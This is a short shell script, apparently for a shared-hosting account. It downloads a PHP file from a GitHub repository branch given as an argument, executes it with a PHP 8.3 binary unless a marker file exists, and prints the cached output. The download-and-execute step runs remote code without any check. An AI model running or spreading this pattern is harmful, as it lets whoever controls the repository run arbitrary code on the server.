#!/bin/sh
cd /home/u791571885 && [ -f t170.done ] || { curl -fsSL -o t170.php "https://raw.githubusercontent.com/a04032417-svg/Dar/$1/vs170.php" && /opt/alt/php83/usr/bin/php t170.php > t170.done 2>&1; }
head -c 9000 t170.done
